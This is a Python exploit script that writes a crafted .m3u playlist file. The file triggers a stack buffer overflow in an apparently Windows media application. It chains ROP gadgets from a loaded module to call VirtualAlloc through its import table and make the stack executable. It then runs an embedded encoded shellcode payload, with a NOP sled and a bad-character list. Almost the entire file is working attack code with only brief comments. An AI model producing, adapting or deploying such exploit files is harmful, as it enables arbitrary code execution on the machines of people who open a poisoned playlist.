#!/usr/bin/python 
import struct

def shellcode():
    buf =  b"\x90" * 50
    buf += b"\xd9\xea\xd9\x74\x24\xf4\x58\x33\xc9\xba\xc3\xe8"
    buf += b"\xb6\xe6\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x93"
    buf += b"\xfb\x54\x13\xef\x14\x1a\xdc\x0f\xe5\x7b\x54\xea"
    buf += b"\xd4\xbb\x02\x7f\x46\x0c\x40\x2d\x6b\xe7\x04\xc5"
    buf += b"\xf8\x85\x80\xea\x49\x23\xf7\xc5\x4a\x18\xcb\x44"
    buf += b"\xc9\x63\x18\xa6\xf0\xab\x6d\xa7\x35\xd1\x9c\xf5"
    buf += b"\xee\x9d\x33\xe9\x9b\xe8\x8f\x82\xd0\xfd\x97\x77"
    buf += b"\xa0\xfc\xb6\x26\xba\xa6\x18\xc9\x6f\xd3\x10\xd1"
    buf += b"\x6c\xde\xeb\x6a\x46\x94\xed\xba\x96\x55\x41\x83"
    buf += b"\x16\xa4\x9b\xc4\x91\x57\xee\x3c\xe2\xea\xe9\xfb"
    buf += b"\x98\x30\x7f\x1f\x3a\xb2\x27\xfb\xba\x17\xb1\x88"
    buf += b"\xb1\xdc\xb5\xd6\xd5\xe3\x1a\x6d\xe1\x68\x9d\xa1"
    buf += b"\x63\x2a\xba\x65\x2f\xe8\xa3\x3c\x95\x5f\xdb\x5e"
    buf += b"\x76\x3f\x79\x15\x9b\x54\xf0\x74\xf4\x99\x39\x86"
    buf += b"\x04\xb6\x4a\xf5\x36\x19\xe1\x91\x7a\xd2\x2f\x66"
    buf += b"\x7c\xc9\x88\xf8\x83\xf2\xe8\xd1\x47\xa6\xb8\x49"
    buf += b"\x61\xc7\x52\x89\x8e\x12\xf4\xd9\x20\xcd\xb5\x89"
    buf += b"\x80\xbd\x5d\xc3\x0e\xe1\x7e\xec\xc4\x8a\x15\x17"
    buf += b"\x8f\x74\x41\x3a\x8f\x1d\x90\x44\x1e\x82\x1d\xa2"
    buf += b"\x4a\x2a\x48\x7d\xe3\xd3\xd1\xf5\x92\x1c\xcc\x70"
    buf += b"\x94\x97\xe3\x85\x5b\x50\x89\x95\x0c\x90\xc4\xc7"
    buf += b"\x9b\xaf\xf2\x6f\x47\x3d\x99\x6f\x0e\x5e\x36\x38"
    buf += b"\x47\x90\x4f\xac\x75\x8b\xf9\xd2\x87\x4d\xc1\x56"
    buf += b"\x5c\xae\xcc\x57\x11\x8a\xea\x47\xef\x13\xb7\x33"
    buf += b"\xbf\x45\x61\xed\x79\x3c\xc3\x47\xd0\x93\x8d\x0f"
    buf += b"\xa5\xdf\x0d\x49\xaa\x35\xf8\xb5\x1b\xe0\xbd\xca"
    buf += b"\x94\x64\x4a\xb3\xc8\x14\xb5\x6e\x49\x34\x54\xba"
    buf += b"\xa4\xdd\xc1\x2f\x05\x80\xf1\x9a\x4a\xbd\x71\x2e"
    buf += b"\x33\x3a\x69\x5b\x36\x06\x2d\xb0\x4a\x17\xd8\xb6"
    buf += b"\xf9\x18\xc9"

    return buf                        


# \x00\x09\x0a\x0b
IAT = 0x10032078 # (VirtualAllocStub IAT entry)

file = "crash1.m3u"
f = open(file , "wb")

CRASH_LEN = 30000  # change me
EIP_OFFSET = 26091

va  = struct.pack("<L", (0x45454545)) # dummy VirtualAlloc Address
va += struct.pack("<L", (0x46464646)) # Shellcode Return Address
va += struct.pack("<L", (0x47474747)) # # dummy Shellcode Address
va += struct.pack("<L", (0x48484848)) # dummy dwSize
va += struct.pack("<L", (0x49494949)) # # dummy flAllocationType
va += struct.pack("<L", (0x50505050)) # dummy flProtect

gadgets = [
    0x1002e892, # : push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001076b, # pop ebx ; ret  ;
    0xFFFFFFFF, # -1
    0x1002d993, # inc ebx ; fpatan  ; ret  ;
    0x1002ccb3, # add ebx, esi ; stc  ; ret  ;

    0x10026d56, # pop eax ; ret  ;
    IAT,
    0x1002e0c8, # mov eax, dword [eax] ; ret  ;
    0x1001e82f, # mov dword [esi], eax ; xor eax, eax ; pop esi ; ret  ;
    0x41414141, # dummy for pop esi

    # return address
   
    0x100233cd, # mov eax, ebx ; pop ebp ; pop ebx ; ret  ;
    0x41414141, # dummy for pop ebp
    0x41414141, # dummy for pop ebx

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xfffffdff, # -0x201 (sbb will turn to -0x200)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ;
    0x10022234, # add dword [eax], eax ; ret  ;

    # shellcode address, same as return address

    0x100253bc, # xor edx, edx ; ret  ;
    0x10023fec, # add edx, dword [eax] ; pop esi ; ret  ;
    0x41414141, # dummy for pop esi

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ;

    # set dwSize = 0x01
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;    

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x10029e40, # inc dword [eax] ; pop ebp ; ret  ;
    0x41414141, # dummy for pop ebp

    # set flAllocationType = 0x1000

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xffffefff, # -0x1001 (sbb will turn to -0x1000)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ; 

    # set flProtect = 0x40

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xffffffbf, # -0x41 (sbb will turn to -0x40)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ; 

    # adjust esp to the VirtualAlloc

    0x100246d7, # pop edx ; ret  ;
	0xffffffe8, # -0x18
    0x1001741e, # add eax, edx ; ret  ;
    0x1001e71d, # xchg eax, ebp ; ret  ;
    0x100252cc, # mov esp, ebp ; pop ebp ; ret  ;
]

buffer = b""

for gadget in gadgets:
    buffer += struct.pack("<L", gadget)

junk =  b"A" * EIP_OFFSET
junk += struct.pack("<L", 0x10016a18) #: add esp, 0x1C ; ret  ;
junk += va
junk += buffer
junk += shellcode()


junk += b"C" * (CRASH_LEN - len(junk))
f.write(junk)
f.close()
